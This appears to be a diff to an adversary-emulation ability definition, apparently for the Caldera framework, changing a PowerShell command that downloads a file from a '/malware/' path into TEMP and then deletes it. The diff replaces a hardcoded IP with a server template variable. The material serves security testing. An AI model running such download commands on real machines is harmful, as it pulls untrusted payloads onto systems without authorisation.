@@ -9,8 +9,9 @@
   executors:
   - name: psh
     platform: windows
-    command: "Invoke-WebRequest http://198.18.133.49/malware/apptom.ppt -OutFile $env:TEMP/apptom.ppt;\
-      \ \nStart-Sleep -Seconds 3; \nRemove-Item \"$env:TEMP\\apptom.ppt\" -Force"
+    command: "Invoke-WebRequest http://#{caldera.host}/malware/apptom.ppt -OutFile\
+      \ $env:TEMP/apptom.ppt; \nStart-Sleep -Seconds 3; \nRemove-Item \"$env:TEMP\\\
+      apptom.ppt\" -Force"
     code: null
     language: null
     build_target: null
